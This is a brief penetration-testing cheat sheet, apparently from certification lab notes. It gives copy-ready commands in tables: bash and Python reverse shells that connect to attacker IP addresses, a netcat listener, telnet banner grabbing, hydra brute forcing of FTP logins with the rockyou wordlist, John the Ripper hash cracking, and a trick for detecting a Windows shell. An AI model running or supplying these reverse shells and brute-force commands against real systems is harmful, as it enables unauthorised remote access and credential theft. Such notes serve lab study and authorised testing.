| **Reverse shells** | **Description** |
| ---- | ---- |
| `bash -i >& /dev/tcp/192.168.119.3/4444 0>&1` | Common reverse shell |
| `bash -c "bash -i >& /dev/tcp/192.168.119.3/4444 0>&1"` | If prior shell doesn't work due to Bourne Shell |
| `python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("192.168.45.190",9001));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/bash")'` | Python reverse shell |
|  |  |

| **Netcat listener** | **Description** |
| ---- | ---- |
| `nc -nvlp 9001` | In port 9001 |

| **Banner grabbing** | **Description** |
| ---- | ---- |
| `telnet 10.10.10.10 22` | For ip 10.10.10.10 in port 22 |

| **Brute forcing** | **Description** |
| ---- | ---- |
| `hydra -l admin -P /usr/share/wordlists/rockyou.txt -e nsr -f ftp://192.168.222.46` | FTP |

| **Hash cracking** | **Description** |
| ---- | ---- |
| `john offsec.hash -wordlist=/usr/share/wordlists/rockyou.txt` | John The Ripper with wordlist |

Windows - Check current shell:
```shell
(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell
```